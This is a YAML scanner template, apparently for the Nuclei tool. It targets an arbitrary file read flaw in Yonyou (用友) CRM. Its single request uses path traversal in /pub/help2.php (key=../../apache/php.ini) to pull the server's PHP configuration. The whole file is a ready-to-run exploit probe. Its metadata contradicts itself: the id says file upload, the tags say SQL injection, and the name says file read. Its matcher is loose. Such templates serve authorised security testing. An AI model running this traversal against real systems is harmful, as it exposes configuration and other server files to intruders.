id: yongyouOA-CRM-file-upload

info:
  name: 用友CRM 任意文件读取漏洞
  author: cnaq
  severity: high  
  description: 用友CRM 任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BCRM%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - |
        GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Connection: close
        
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - 'php.ini'
